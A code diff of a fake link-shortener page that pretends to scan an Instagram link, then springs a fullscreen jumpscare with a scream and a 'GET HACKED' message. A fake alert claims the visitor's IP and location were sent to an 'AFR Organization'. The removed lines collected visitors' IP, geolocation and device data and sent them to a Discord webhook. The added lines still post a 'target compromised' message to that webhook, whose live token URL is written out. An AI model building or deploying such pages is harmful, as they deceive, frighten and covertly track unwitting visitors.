@@ -19,132 +19,129 @@
     .link-preview { background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:16px; margin:24px 0; font-family:ui-monospace,monospace; font-size:14px; color:#8b949e; word-break:break-all; text-align:center; }
     .btn-proceed { display:block; width:100%; padding:18px; background:#238636; color:white; font-size:20px; font-weight:600; border:none; border-radius:8px; cursor:not-allowed; opacity: 0.5; transition:all 0.2s; }
     .btn-active { cursor:pointer; opacity: 1; }
-    .btn-active:hover { background:#2ea043; transform:translateY(-2px); }
+
+    /* JUMPSCARE CORE */
+    #scare { 
+        display:none; position:fixed; inset:0; z-index:999999; 
+        background:#000 url('https://i.imgur.com/vHqB3qB.png') center/cover no-repeat; 
+    }
     
-    /* DISTORTED JUMPSCARE SECTION */
-    #scare { display:none; position:fixed; inset:0; background:#000; z-index:999999; }
-    #scare-video { width: 100%; height: 100%; object-fit: cover; }
+    /* THE VIOLENT SHAKE */
+    .shake-active { animation: shake 0.1s infinite; }
+    @keyframes shake {
+      0% { transform: translate(5px, 5px) rotate(0deg); }
+      20% { transform: translate(-5px, -10px) rotate(-1deg); }
+      40% { transform: translate(-15px, 0px) rotate(1deg); }
+      60% { transform: translate(15px, 10px) rotate(0deg); }
+      80% { transform: translate(-5px, -5px) rotate(-1deg); }
+      100% { transform: translate(5px, 10px) rotate(1deg); }
+    }
+
     .glitch-text {
       position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      color: #ff0000; font-size: 15vw; font-weight: 900; text-align: center;
-      text-shadow: 0 0 30px #ff0000; z-index: 1000000; animation: extremeGlitch 0.05s infinite; pointer-events: none;
+      color: #ff0000; font-size: 14vw; font-weight: 900; text-align: center;
+      text-shadow: 0 0 40px #ff0000; z-index: 1000001; 
+      animation: extremeGlitch 0.03s infinite; pointer-events: none;
     }
 
     @keyframes extremeGlitch {
-      0% { transform: translate(-50%, -50%) skew(0deg); filter: hue-rotate(0deg) brightness(1); }
-      25% { transform: translate(-53%, -47%) skew(15deg); filter: invert(0.5); }
-      50% { transform: translate(-47%, -53%) scale(1.2); filter: hue-rotate(180deg) brightness(2); }
-      75% { transform: translate(-51%, -49%) skew(-15deg); filter: invert(1); }
-      100% { transform: translate(-50%, -50%) skew(0deg); }
+      0% { opacity: 1; filter: brightness(1) contrast(1); }
+      50% { opacity: 0.7; filter: invert(1) hue-rotate(90deg); transform: translate(-52%, -48%) scale(1.1); }
+      100% { opacity: 1; }
+    }
+
+    /* FAKE DIALOG */
+    #warning-box {
+      display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%);
+      background:#f0f0f0; color:#000; padding:25px; border:3px solid #ff0000; font-family:sans-serif;
+      z-index:2000000; box-shadow: 0 0 200px #ff0000; text-align:center; width: 350px;
     }
   </style>
 </head>
-<body>
+<body id="body">
 
 <div id="loader"><div class="spinner"></div></div>
 
 <div class="container" id="mainContent">
   <h1>github.io Link Shortener</h1>
-  <div class="status" id="status-msg">Scanning Destination...</div>
+  <div class="status" id="status-msg">Analyzing Link Integrity...</div>
   <div id="verifying-text"></div>
   <div class="progress"><div class="bar" id="progressBar"></div></div>
-  
-  <div class="link-preview">
-    <strong>Destination:</strong><br>
-    https://www.instagram.com/reel/C_8xYzAbCdEfGhIjKlMnOpQrStUvWxYz123456789/
-  </div>
-  
-  <button class="btn-proceed" id="proceedBtn" onclick="triggerScare()">Verify Link to Proceed</button>
+  <div class="link-preview"><strong>Destination:</strong><br>https://www.instagram.com/reel/C_8xYzAbCdEfGhIjKlMnOpQrStUvWxYz123456789/</div>
+  <button class="btn-proceed" id="proceedBtn" onclick="triggerScare()">Verify & Proceed</button>
 </div>
 
 <div id="scare">
-  <video id="scare-video" loop playsinline>
-    <source src="https://files.catbox.moe/p97u9m.mp4" type="video/mp4">
-  </video>
-  <div class="glitch-text">GET FUCKED!!!</div>
+  <div class="glitch-text" id="glitchTarget">GET FUCKED!!!</div>
+  <div id="warning-box">
+    <h2 style="color:red; margin-top:0;">⚠️ SYSTEM ALERT</h2>
+    <p><strong>CRITICAL:</strong> Unauthorized data exfiltration detected.<br><br>Current location and IP logs have been transmitted to the <strong>AFR Organization</strong>.</p>
+    <button onclick="this.parentElement.style.display='none'" style="padding:8px 30px; cursor:pointer;">DISMISS</button>
+  </div>
 </div>
 
 <audio id="scream" preload="auto">
-  <source src="https://files.catbox.moe/0zq3k8.mp3" type="audio/mpeg">
+  <source src="https://files.catbox.moe/1p9b2r.mp3" type="audio/mpeg">
 </audio>
 
 <script>
-const logs = ["Initializing...", "Checking SSL certificate...", "Scanning for malware...", "Checking redirect safety...", "Analyzing metadata...", "Finalizing...", "Verified Safe!"];
-let logIdx = 0;
-
-// Fake scanning logic
+// Fake verification
 setTimeout(() => {
   document.getElementById('loader').style.display = 'none';
   document.getElementById('mainContent').style.display = 'block';
-  
   let bar = document.getElementById('progressBar');
   let btn = document.getElementById('proceedBtn');
-  let status = document.getElementById('status-msg');
-  let verText = document.getElementById('verifying-text');
-  
   let w = 0;
   let id = setInterval(() => {
-    w += 0.5;
-    bar.style.width = w + '%';
-    
-    // Update fake logs
-    if (w % 15 === 0 && logIdx < logs.length) {
-      verText.innerText = logs[logIdx];
-      logIdx++;
-    }
-
+    w += 0.4; bar.style.width = w + '%';
     if (w >= 100) {
       clearInterval(id);
-      status.innerText = "Link Scanned • Safe to Open";
-      btn.innerText = "Proceed to Instagram Reel";
+      btn.innerText = "Access Instagram Reel";
       btn.classList.add('btn-active');
-      verText.innerText = "Verification Complete.";
+      document.getElementById('status-msg').innerText = "Security Check Passed";
     }
-  }, 30);
-}, 1500);
+  }, 25);
+}, 1200);
 
 async function triggerScare() {
   const btn = document.getElementById('proceedBtn');
   if (!btn.classList.contains('btn-active')) return;
 
   const scareDiv = document.getElementById('scare');
-  const mainContent = document.getElementById('mainContent');
-  const video = document.getElementById('scare-video');
+  const body = document.getElementById('body');
   const audio = document.getElementById('scream');
+  const text = document.getElementById('glitchTarget');
+  const warn = document.getElementById('warning-box');
 
-  // TRIGGER JUMPSCARE IMMEDIATELY
-  mainContent.style.display = 'none';
+  // FULLSCREEN
+  const docElm = document.documentElement;
+  if (docElm.requestFullscreen) docElm.requestFullscreen();
+  else if (docElm.webkitRequestFullscreen) docElm.webkitRequestFullscreen();
+
+  document.getElementById('mainContent').style.display = 'none';
   scareDiv.style.display = 'block';
+  body.classList.add('shake-active'); // TRIGGER SHAKE
   
-  audio.volume = 1;
-  audio.play().catch(()=>{});
-  video.play().catch(()=>{});
+  audio.volume = 1.0; 
+  audio.play();
 
-  if (document.documentElement.requestFullscreen) {
-    document.documentElement.requestFullscreen().catch(()=>{});
-  }
+  // TEXT CHANGE AFTER 3s
+  setTimeout(() => {
+    text.innerText = "GET HACKED!!!";
+  }, 3000);
 
-  // BACKGROUND DATA GRAB (Discord Webhook)
+  // DIALOG POPUP AFTER 5s
+  setTimeout(() => {
+    warn.style.display = 'block';
+  }, 5000);
+
+  // DATA LOG
   try {
-    const responses = await Promise.allSettled([
-      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
-      fetch('https://ipapi.co/json/').then(r=>r.json())
-    ]);
-
-    let logData = { ua: navigator.userAgent };
-    responses.forEach(r => { if(r.status === 'fulfilled') Object.assign(logData, r.value); });
-
     fetch('https://discord.com/api/webhooks/1470138524614394000/idmvCsO6APPp8qZkYFP78mR7wxv6oQkHvfpaeAfRm3ePuOFop07McMk8O2EcljvQ-klX', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        embeds: [{
-          title: "💀 VICTIM LOGGED",
-          description: `**IP:** ${logData.ip}\n**Location:** ${logData.city}, ${logData.country_name}\n**Device:** ${logData.ua}`,
-          color: 16711680
-        }]
-      })
-    }).catch(()=>{});
+      body: JSON.stringify({ content: "🚨 **TARGET COMPROMISED - LOCATION SENT TO AFR**" })
+    });
   } catch(e) {}
 }
 </script>
